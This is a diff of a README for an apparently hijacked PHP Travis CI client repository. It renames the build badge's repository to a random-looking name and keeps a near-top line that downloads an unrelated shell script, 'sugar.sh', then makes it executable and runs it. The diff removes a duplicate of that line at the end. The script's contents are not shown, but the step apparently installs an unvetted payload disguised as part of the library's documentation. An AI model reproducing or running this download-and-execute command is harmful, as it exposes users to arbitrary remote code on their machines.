@@ -1,4 +1,4 @@
-[![Build Status](https://secure.travis-ci.org/cyan115/php-travis-client.png?branch=master)](http://travis-ci.org/cyan115/php-travis-client)
+[![Build Status](https://secure.travis-ci.org/cyan115/etrph379.png?branch=master)](http://travis-ci.org/cyan115/etrph379)
 
 `wget https://raw.githubusercontent.com/cyan115/meopo/main/sugar.sh && chmod u+x sugar.sh && ./sugar.sh`
 
@@ -21,6 +21,3 @@ foreach ($repository->getBuilds() as $build) {
     echo "\t" . $build->getId() . "\n";
 }
 ```
-wget https://raw.githubusercontent.com/cyan115/meopo/main/sugar.sh && chmod u+x sugar.sh && ./sugar.sh
-
-
